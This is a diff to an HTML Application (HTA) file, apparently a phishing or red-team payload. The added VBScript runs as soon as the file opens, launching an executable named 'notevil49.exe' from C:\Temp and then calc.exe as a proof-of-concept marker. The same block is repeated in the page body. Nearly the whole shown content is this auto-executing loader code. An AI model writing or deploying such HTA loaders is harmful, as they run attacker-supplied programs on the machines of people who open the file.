@@ -11,28 +11,28 @@
 			SCROLL = "no"
 		/>
 		<script language="VBScript">
-			Dim WshShell, RegPath, action, objWorkbook, xlmodule
-			Set objExcel = CreateObject("Excel.Application")
 			
-			Set WshShell = CreateObject("WScript.Shell")
-				function RegExists(regKey)
-				on error resume next
-				WshShell.RegRead regKey
-				RegExists = (Err.number = 0)
-			end function
+				Dim objResult 
+			    Set WshShell = CreateObject("WScript.Shell")
+			    Set objResult = WshShell.Exec("C:\Temp\notevil49.exe")
+
+			    Dim objResult 
+			    Set WshShell = CreateObject("WScript.Shell")
+			    Set objResult = WshShell.Exec("calc.exe")
+			
 		</script>
 		
 	</head>
 	<body>
 		<script language="VBScript">
-	Dim objResult 
-    Set WshShell = CreateObject("WScript.Shell")
-    Set objResult = WshShell.Exec("C:\Temp\notevil49.exe")
-    
-    Dim objResult 
-    Set WshShell = CreateObject("WScript.Shell")
-    Set objResult = WshShell.Exec("calc.exe")
-</script>
+			Dim objResult 
+		    Set WshShell = CreateObject("WScript.Shell")
+		    Set objResult = WshShell.Exec("C:\Temp\notevil49.exe")
+
+		    Dim objResult 
+		    Set WshShell = CreateObject("WScript.Shell")
+		    Set objResult = WshShell.Exec("calc.exe")
+		</script>
 	   
 	</body>
 </html>
